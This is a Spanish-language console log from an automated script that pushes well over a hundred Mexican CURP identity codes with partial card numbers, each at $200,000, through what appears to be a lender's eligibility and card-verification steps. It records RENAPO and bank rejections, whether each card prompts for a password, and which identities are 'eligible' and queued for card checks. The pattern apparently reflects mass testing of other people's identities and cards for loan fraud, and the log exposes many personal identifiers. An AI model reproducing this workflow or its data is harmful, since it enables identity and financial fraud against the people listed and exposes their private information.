[145] ID:1862672 | MOIM710912HSORRR08 | $200,000 | SONORA | T:4521... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[146] ID:1870279 | CUEG800506HDGVSS06 | $200,000 | DURANGO | T:6838... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3711 para ID:1834814 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[147] ID:1874323 | RIAM731014HCMNNG08 | $200,000 | COLIMA | T:9373... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.6s)
[148] ID:1905591 | MEMA711024HTSLRL05 | $200,000 | TAMAULIPAS | T:6894... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6838 para ID:1870279 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[149] ID:1907499 | RONL720920MCGMMR07 | $200,000 | COAHUILA | T:6098... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[150] ID:1910434 | LOZM690228MDFPRN08 | $200,000 | CIUDAD DE ME | T:0796... [🔴 OFF] Rechazo bancario (PE020) (16.2s)
[151] ID:1912051 | HASL720122MDFRWR09 | $200,000 | CIUDAD DE ME | T:6357... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[152] ID:1912464 | LOCR720830MDFZNS07 | $200,000 | CIUDAD DE ME | T:5675... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.2s)
[153] ID:1936328 | LUHA700521HMSLRN01 | $200,000 | MORELOS | T:7334... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.5s)
[154] ID:1938662 | HECR690922HPLRRN01 | $200,000 | PUEBLA | T:5668... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6357 para ID:1912051 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[155] ID:1940029 | MORD690107HNLLYG05 | $200,000 | NUEVO LEON | T:5176... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[156] ID:1940274 | BADR701127MSORRX07 | $200,000 | SONORA | T:9805... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[157] ID:1962969 | SELR710923MMCRPC05 | $200,000 | ESTADO DE ME | T:2716... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5675 para ID:1912464 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[158] ID:1970804 | VESO780410HVRRNS04 | $200,000 | VERACRUZ | T:4470... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[159] ID:1981882 | JASA740806HDFRLG03 | $200,000 | CIUDAD DE ME | T:2371... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.5s)
[160] ID:1983399 | NUEM731221MMNNSR02 | $200,000 | MICHOACAN | T:1589... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[161] ID:2009821 | RACF701113HJCNRR09 | $200,000 | JALISCO | T:4722... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2371 para ID:1981882 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[162] ID:2028053 | BOPH690405HTCJRM05 | $200,000 | TABASCO | T:4269... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[163] ID:2047710 | CARL690626HBCRMS00 | $200,000 | BAJA CALIFOR | T:3401... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4722 para ID:2009821 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.1s)
[164] ID:2056664 | RABJ780330MCHMRL03 | $200,000 | CHIHUAHUA | T:9445... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[165] ID:2096752 | ROPR740221HTSDNL04 | $200,000 | TAMAULIPAS | T:8042... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3401 para ID:2047710 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.9s)
[166] ID:2118637 | GAFH721216HCGRLC09 | $200,000 | COAHUILA | T:5453... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[167] ID:2122432 | PACR700514HMCRHC05 | $200,000 | ESTADO DE ME | T:9508... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[168] ID:2132312 | CARE720529HCPSDD04 | $200,000 | CAMPECHE | T:5101... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[169] ID:2135635 | LOAI710212HMNPNG08 | $200,000 | MICHOACAN | T:6031... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[170] ID:2140066 | OOLH700907HJCRZC03 | $200,000 | JALISCO | T:8960... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[171] ID:2161594 | LASA690826HTSRLG03 | $200,000 | TAMAULIPAS | T:9902... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6031 para ID:2135635 ($200,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.8s)
[172] ID:2177146 | ROCJ731204HCMDRL05 | $200,000 | COLIMA | T:1029... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[173] ID:2179002 | VAMG710721MSOZRB01 | $200,000 | SINALOA | T:6974... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[174] ID:2191234 | DIAA720428HNLZLL00 | $200,000 | NUEVO LEON | T:5076... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.1s)
[175] ID:2206291 | JIAL691004HCSMGS03 | $200,000 | CHIAPAS | T:1196... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[176] ID:2207102 | BAMV700728HOCRRC02 | $200,000 | OAXACA | T:1138... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[177] ID:2214679 | RAHR690821HDFMRB04 | $200,000 | CIUDAD DE ME | T:7472... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5076 para ID:2191234 ($200,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (14.3s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.0s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1196 para ID:2206291 ($200,000)... [178] ID:2220218 | CAGM711004MTLBNN01 | $200,000 | TLAXCALA | T:3400... [179] ID:2228307 | VECA690902MGTLND02 | $200,000 | GUANAJUATO | T:5308... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[180] ID:2237616 | RALA710101HMCNGN09 | $200,000 | ESTADO DE ME | T:7087... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[181] ID:2244880 | SOOJ690322HJCLCS05 | $200,000 | JALISCO | T:4353... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7472 para ID:2214679 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[182] ID:2248626 | LOCL760620MMSPHL03 | $200,000 | MORELOS | T:9466... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[183] ID:2251594 | CAMM720418HDFRNN04 | $200,000 | CIUDAD DE ME | T:4049... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[184] ID:2251765 | RONM720423HVRDTN06 | $200,000 | VERACRUZ | T:9041... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[185] ID:2258146 | ZECM780916MSOPNR02 | $200,000 | SINALOA | T:0242... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[186] ID:2279044 | MAHM700112MMCNRN07 | $200,000 | ESTADO DE ME | T:3111... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.5s)
[187] ID:2288589 | TOHC710413MJCRRR04 | $200,000 | JALISCO | T:6995... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[188] ID:2299359 | BOVS731118MBCJLM08 | $200,000 | BAJA CALIFOR | T:3848... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (13.5s)
[189] ID:2317222 | VAJU731212HSOXLL00 | $200,000 | SONORA | T:7168... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.6s)
[190] ID:2319931 | NUSJ701027HTSNNR06 | $200,000 | TAMAULIPAS | T:3975... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[191] ID:2320670 | SARS690728HMCZZR05 | $200,000 | ESTADO DE ME | T:0452... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[192] ID:2327547 | MAGR730305HYCRRN09 | $200,000 | YUCATAN | T:0435... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[193] ID:2327979 | VARD690107MJCRDL00 | $200,000 | JALISCO | T:7183... [🔴 OFF] Rechazo bancario (PE110) (19.2s)
[194] ID:2352891 | HEMJ710327HDFRRN04 | $200,000 | CIUDAD DE ME | T:4850... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.1s)
[195] ID:2366695 | MOUO690729HJCNCS08 | $200,000 | JALISCO | T:5576... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7183 para ID:2327979 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[196] ID:2400452 | GUVE740628MHGTRV06 | $200,000 | HIDALGO | T:3389... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[197] ID:2401233 | PAAJ730714HMCCQV01 | $200,000 | ESTADO DE ME | T:8502... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[198] ID:2401857 | DEMM710829HJCLRR04 | $200,000 | JALISCO | T:4117... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3389 para ID:2400452 ($200,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.4s)
[199] ID:2417218 | GOBO710613HSONLM08 | $200,000 | SONORA | T:2768... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[200] ID:2436078 | CACE720504MSORMS03 | $200,000 | SINALOA | T:9364... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[201] ID:2438418 | MOCR741013MPLRTY09 | $200,000 | PUEBLA | T:7121... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.3s)
[202] ID:2442109 | AUSC690503HNLGNR07 | $200,000 | NUEVO LEON | T:2680... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4117 para ID:2401857 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.7s)
[203] ID:2472653 | SULA010101MDFNNRA4 | $200,000 | CIUDAD DE ME | T:9453... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[204] ID:2473733 | MOEH740812HQRNSC04 | $200,000 | QUINTANA ROO | T:2684... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7121 para ID:2438418 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[205] ID:2473796 | TAME780411HMCLRD05 | $200,000 | ESTADO DE ME | T:5523... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[206] ID:2478617 | MONJ691130HMNRNS05 | $200,000 | MICHOACAN | T:3228... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.9s)
[207] ID:2512255 | LOCL760620MMSPHL03 | $200,000 | MORELOS | T:6312... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2680 para ID:2442109 ($200,000)... [208] ID:2517880 | RODJ711212MCMJLD05 | $200,000 | COLIMA | T:6107... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[209] ID:2522454 | COLR860430MNTVPF03 | $200,000 | NAYARIT | T:0418... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[210] ID:2522976 | WIDA710529HCHBYB05 | $200,000 | CHIHUAHUA | T:1388... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.1s)
[211] ID:2541030 | SAHC740521MGRLRR05 | $200,000 | GUERRERO | T:5784... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0418 para ID:2522454 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[212] ID:2553891 | VICF770323HBCLRB07 | $200,000 | BAJA CALIFOR | T:2915... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[213] ID:2554870 | LOSJ700515HGRPTM08 | $200,000 | GUERRERO | T:9579... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.6s)
[214] ID:2556300 | MAGO691121HBCRRS06 | $200,000 | BAJA CALIFOR | T:0159... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1388 para ID:2522976 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[215] ID:2559420 | CAGJ710914HPLMLV03 | $200,000 | PUEBLA | T:7391... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[216] ID:2584981 | HECR690922HPLRRN01 | $200,000 | PUEBLA | T:5358... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0159 para ID:2556300 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[217] ID:2587895 | RADB710814MVRMRR04 | $200,000 | VERACRUZ | T:7308... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[218] ID:2595134 | RUMC700203MJCBNL09 | $200,000 | JALISCO | T:3028... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (12.0s)
[219] ID:2597236 | SEHP751222MDFRRL01 | $200,000 | CIUDAD DE ME | T:5645... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.3s)
[220] ID:2599597 | PETC750927HVRRRR05 | $200,000 | VERACRUZ | T:7314... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3028 para ID:2595134 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[221] ID:2613355 | BAMK800501HDFLTR08 | $200,000 | CIUDAD DE ME | T:4208... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.2s)
[222] ID:2618092 | CALA710704HYCSPL09 | $200,000 | YUCATAN | T:0585... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5645 para ID:2597236 ($200,000)... [223] ID:2620871 | OISA750727HDFRNX06 | $200,000 | CIUDAD DE ME | T:0967... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.1s)
[224] ID:2661261 | JUJL730210HTSRRS04 | $200,000 | TAMAULIPAS | T:6601... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[225] ID:2672168 | CERE700313HNLRZV07 | $200,000 | NUEVO LEON | T:3227... [🔴 OFF] Contacto preexistente (/confirm-contact) (20.7s)
[226] ID:2672771 | ROCA690207MMNMRN04 | $200,000 | MICHOACAN | T:3858... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3227 para ID:2672168 ($200,000)... [227] ID:2673379 | MUEW710217HYCNSL05 | $200,000 | YUCATAN | T:8942... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.4s)
[228] ID:2673471 | AAML741023HSOMJS02 | $200,000 | SINALOA | T:8358... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.3s)
[229] ID:2675236 | UITS721004HMSRRL00 | $200,000 | MORELOS | T:7428... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[230] ID:2675891 | PAGC771207HBCTRR09 | $200,000 | BAJA CALIFOR | T:6308... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[231] ID:2696746 | ZATR730406HGTRRB04 | $200,000 | GUANAJUATO | T:9322... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[232] ID:2702662 | HEZH720605HDFRVG07 | $200,000 | CIUDAD DE ME | T:8334... [🔴 OFF] Rechazo bancario (PE170) (15.0s)
[233] ID:2706156 | MOMA700427HMCRDR04 | $200,000 | ESTADO DE ME | T:3379... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[234] ID:2712138 | VIAR810529HCGLLY07 | $200,000 | COAHUILA | T:0063... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[235] ID:2715263 | VIMM711103HBSLYN04 | $200,000 | BAJA CALIFOR | T:1097... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[236] ID:2752835 | CATA730120HNLNRL03 | $200,000 | NUEVO LEON | T:0444... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[237] ID:2755166 | HUAJ741202MCSSLN08 | $200,000 | CHIAPAS | T:7149... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[238] ID:2757658 | AERR720704HSPRZF03 | $200,000 | SAN LUIS POT | T:8409... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[239] ID:2779251 | SARC780722MSPLMR01 | $200,000 | SAN LUIS POT | T:2838... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[240] ID:2784822 | AAPL701107HGRLRS05 | $200,000 | GUERRERO | T:9526... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[241] ID:2784954 | MORR730827HJCRMD05 | $200,000 | JALISCO | T:3843... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2838 para ID:2779251 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.7s)
[242] ID:2786074 | MEJI710116HMNNMG07 | $200,000 | MICHOACAN | T:2591... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9526 para ID:2784822 ($200,000)... [🔴 OFF] Rechazo bancario (PE170) (15.3s)
[243] ID:2790750 | OEPM760303HDFRRR07 | $200,000 | CIUDAD DE ME | T:3570... [🔴 OFF] Rechazo bancario (PE020) (10.3s)
[244] ID:2802738 | MOGE720401HQTRTN02 | $200,000 | QUERETARO | T:2538... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[245] ID:2804959 | JISM731011MDFMNN02 | $200,000 | CIUDAD DE ME | T:7529... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.1s)
[246] ID:2818156 | GOOL700917HBSMRS06 | $200,000 | BAJA CALIFOR | T:8182... [🔴 OFF] Rechazo bancario (PE160) (10.7s)
[247] ID:2826251 | TUMG751105MVRRYD03 | $200,000 | VERACRUZ | T:1854... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[248] ID:2839066 | PETG690924HQTRWR07 | $200,000 | QUERETARO | T:1754... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[249] ID:2853628 | AACR730904HDFLRD03 | $200,000 | CIUDAD DE ME | T:6188... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[250] ID:2855613 | SAMS740313MASLNN05 | $200,000 | AGUASCALIENT | T:5122... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[251] ID:2856033 | CUBA721102HSORRL02 | $200,000 | SONORA | T:1204... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[252] ID:2858735 | MOAS700917MSORLR07 | $200,000 | SONORA | T:1566... [🔴 OFF] Rechazo bancario (PE040) (13.3s)
[253] ID:2903532 | VAPC770819MGTRNL07 | $200,000 | GUANAJUATO | T:6989... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[254] ID:2910685 | MEDS720115MDGJZR07 | $200,000 | DURANGO | T:3575... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[255] ID:2913598 | CAMI700912MTSSTS05 | $200,000 | TAMAULIPAS | T:7422... [🔴 OFF] Rechazo bancario (PE170) (16.6s)
[256] ID:2930783 | TOED730114HDFRND04 | $200,000 | CIUDAD DE ME | T:8307... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.9s)
[257] ID:2941857 | SOAJ740703HSOYGS09 | $200,000 | SONORA | T:1594... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[258] ID:2947434 | PEGA710720HDFRNL08 | $200,000 | CIUDAD DE ME | T:7601... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[259] ID:2963865 | HEVM690329MDFRZR04 | $200,000 | CIUDAD DE ME | T:2182... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[260] ID:2970725 | SARA730907HGTLJL09 | $200,000 | GUANAJUATO | T:0902... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.8s)
[261] ID:2971509 | MEGA801026HBCRNL02 | $200,000 | BAJA CALIFOR | T:1757... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2182 para ID:2963865 ($200,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[262] ID:2973655 | RIRA700907MVRSYN00 | $200,000 | VERACRUZ | T:6874... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[263] ID:2973879 | BAGT710516MCCLLR01 | $200,000 | CAMPECHE | T:5553... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[264] ID:2976684 | BAOM720401HSOCRR00 | $200,000 | SINALOA | T:8489... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[265] ID:2980412 | RARL730212MDFMDR03 | $200,000 | CIUDAD DE ME | T:1790... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[266] ID:2980861 | RUOA780712MCSZRM00 | $200,000 | CHIAPAS | T:0200... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0902 para ID:2970725 ($200,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.7s)
[267] ID:2981700 | MAQA700316MDFTNL05 | $200,000 | CIUDAD DE ME | T:3569... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[268] ID:3009072 | POAL711205HJCNRR00 | $200,000 | JALISCO | T:4019... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[269] ID:3009596 | GAGF800322HGTLRR09 | $200,000 | GUANAJUATO | T:6958... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3569 para ID:2981700 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[270] ID:3011597 | TEMA691011MNLNRN09 | $200,000 | NUEVO LEON | T:4099... [🔴 OFF] Rechazo bancario (PE110) (20.3s)
[271] ID:3014445 | DIME690305HPLZTL02 | $200,000 | PUEBLA | T:7739... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.1s)
[272] ID:3018838 | OEPM760303HDFRRR07 | $200,000 | CIUDAD DE ME | T:5549... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4099 para ID:3011597 ($200,000)... [🔴 OFF] Rechazo bancario (PE170) (12.0s)
[273] ID:3037529 | BEPJ690624HMCRRN07 | $200,000 | ESTADO DE ME | T:0625... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[274] ID:3040317 | MODH720203HJCNLC07 | $200,000 | JALISCO | T:9296... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[275] ID:3040766 | SACA750930HGTLRR05 | $200,000 | GUANAJUATO | T:5075... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[276] ID:3052317 | REMH700405HJCYLC08 | $200,000 | JALISCO | T:0023... [🔴 OFF] Contacto preexistente (/confirm-contact) (19.3s)
[277] ID:3055091 | MOCF690422HPLNRR04 | $200,000 | PUEBLA | T:4980... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.7s)
[278] ID:3086259 | MOLC701003MQRRPL06 | $200,000 | QUINTANA ROO | T:3235... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[279] ID:3089516 | TOCJ781214HHGLSN05 | $200,000 | HIDALGO | T:3236... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[280] ID:3111764 | BESM710310MPLRNR06 | $200,000 | PUEBLA | T:4814... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[281] ID:3126256 | SESD710902HQRLLV05 | $200,000 | QUINTANA ROO | T:0128... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[282] ID:3127377 | GUSV710703MVRRLR00 | $200,000 | VERACRUZ | T:0148... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.7s)
[283] ID:3160384 | BOMS731008HMCNCR00 | $200,000 | ESTADO DE ME | T:9825... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[284] ID:3165962 | TOAJ700624HMCRRN07 | $200,000 | ESTADO DE ME | T:5446... [285] ID:3172860 | AARR721023MDFLMB06 | $200,000 | CIUDAD DE ME | T:1780... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)
[286] ID:3174312 | LORB700324HJCCXN01 | $200,000 | JALISCO | T:6643... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1780 para ID:3172860 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[287] ID:3193504 | HEMR711030HCHRLB02 | $200,000 | CHIHUAHUA | T:2121... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[288] ID:3202265 | GOCA731106HDFNML08 | $200,000 | CIUDAD DE ME | T:7288... [🔴 OFF] Rechazo bancario (PE170) (16.5s)
[289] ID:3206675 | LOSF720815HCGPLR07 | $200,000 | COAHUILA | T:4832... [⚠️ CARD RETRY] no encontre campo de tarjeta (buc-input) en la página — conservado en cola
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
